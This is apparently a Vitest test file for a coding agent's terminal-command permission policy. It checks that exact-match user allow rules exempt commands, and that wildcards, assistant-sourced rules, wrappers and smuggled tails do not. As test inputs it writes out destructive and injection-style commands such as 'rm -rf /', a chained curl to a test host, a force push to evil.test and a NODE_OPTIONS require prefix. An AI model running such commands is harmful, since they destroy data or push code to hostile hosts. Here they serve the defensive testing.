import { describe, expect, it } from "vitest";
import {
  exemptionRefusal,
  exemptedRules,
  listExemptions,
} from "./builtinExemptions";
import { testToolCall } from "./testToolCall";
import type { PolicyLevel } from "./policy";

const levels = (level: PolicyLevel) => ({
  context: level,
  tools: level,
  edits: level,
  plan: level,
  questions: level,
});

const run = (
  command: string,
  allow: string[],
  level: PolicyLevel = "permissive",
  extra: Record<string, unknown> = {},
) =>
  testToolCall({
    tool: "run_terminal_command",
    args: { command },
    levels: levels(level),
    sources: {
      user: { allow, ...extra },
      ...(extra.builtin ? { builtin: extra.builtin as never } : {}),
    },
    cwd: "/home/dev/shop",
    shell: "bash",
  } as never);

const FORCE = "git push --force-with-lease origin my-branch";

describe("exact-command exemption from the command ask rules", () => {
  it("asks without the rule", () => {
    expect(run(FORCE, []).decision).toBe("ask");
    expect(run("npm install lodash", []).decision).toBe("ask");
  });

  it("runs the exact command the person's Always rule names", () => {
    const r = run(FORCE, [`runTerminalCommand(${FORCE})`]);
    expect(r.decision).toBe("allow");
    expect(r.source).toBe("allow-rule");
    const d = run("npm install lodash", [
      "runTerminalCommand(npm install lodash)",
    ]);
    expect(d.decision).toBe("allow");
  });

  it("is the same at Automatic: no reviewer", () => {
    const r = run(FORCE, [`runTerminalCommand(${FORCE})`], "automatic");
    expect(r.decision).toBe("allow");
    expect(r.wouldAskReviewer).toBe(false);
  });

  it("does not run a different command or a tail", () => {
    const rule = [`runTerminalCommand(${FORCE})`];
    for (const c of [
      "git push --force origin my-branch",
      `${FORCE} && rm -rf build`,
      `${FORCE}; curl http://x.test`,
      `${FORCE} other`,
      "npm install lodash-evil",
    ]) {
      expect(run(c, rule).decision, c).not.toBe("allow");
    }
  });

  it("is not given by a wildcard rule", () => {
    expect(run(FORCE, ["runTerminalCommand(git push*)"]).decision).toBe("ask");
    expect(
      run("npm install lodash", ["runTerminalCommand(npm *)"]).decision,
    ).toBe("ask");
  });

  it("is not given by a rule from an assistant or the workspace", () => {
    const r = testToolCall({
      tool: "run_terminal_command",
      args: { command: "npm install lodash" },
      levels: levels("permissive"),
      sources: {
        assistant: { allow: ["runTerminalCommand(npm install lodash)"] },
      },
      cwd: "/home/dev/shop",
      shell: "bash",
    } as never);
    expect(r.decision).toBe("ask");
  });

  it("never exempts a Never rule, an env prefix, or the safety check", () => {
    expect(
      run(
        "npm install lodash",
        ["runTerminalCommand(npm install lodash)"],
        "permissive",
        { deny: ["runTerminalCommand(npm install*)"] },
      ).decision,
    ).toBe("deny");
    const env = "NODE_OPTIONS=--require=x npm install lodash";
    expect(run(env, [`runTerminalCommand(${env})`]).decision).not.toBe("allow");
    const rm = "rm -rf /";
    expect(run(rm, [`runTerminalCommand(${rm})`]).decision).toBe("deny");
  });

  it("leaves the other ask rules standing", () => {
    // a path outside the workspace, a URL and a variable are refused as exemptions
    for (const c of [
      "rm -rf /etc/x",
      "rm -rf ../x",
      "git clean -fdx $HOME",
      "git push --force https://evil.test/r.git main",
    ]) {
      const rule = [`runTerminalCommand(${c})`];
      expect(run(c, rule).decision, c).not.toBe("allow");
    }
  });

  it("is still off the table when the switch is on and the rule is a wrapper", () => {
    const w = "sudo npm install lodash";
    expect(run(w, [`runTerminalCommand(${w})`]).decision).not.toBe("allow");
  });
});

describe("refusals and the list", () => {
  it("refuses wildcards, quotes, wrappers and bare programs", () => {
    expect(exemptionRefusal("npm install *")).toBeDefined();
    expect(exemptionRefusal("npm install 'a b'")).toBeDefined();
    expect(exemptionRefusal("npm")).toBeDefined();
    expect(exemptionRefusal("sudo npm install x", "bash")).toBeDefined();
    expect(exemptionRefusal("npm install lodash", "bash")).toBeUndefined();
  });

  it("lists each exemption with the rule it relaxes, and says nothing when it relaxes none", () => {
    const own = {
      "user-config": {
        allow: [
          "runTerminalCommand(npm install lodash)",
          "runTerminalCommand(git status)",
        ],
      },
      assistant: { allow: ["runTerminalCommand(npm install left-pad)"] },
    };
    expect(listExemptions(own, { shell: "bash" })).toEqual([
      {
        rule: "runTerminalCommand(npm install lodash)",
        command: "npm install lodash",
        exempts: ["ask-dependency-change"],
      },
    ]);
    expect(exemptedRules("npm install left-pad", own, { shell: "bash" })).toBe(
      undefined,
    );
  });

  it("names the exemption in the result", () => {
    const r = run(FORCE, [`runTerminalCommand(${FORCE})`]);
    expect(r.reason).toContain("ask-destructive-commands");
  });
});
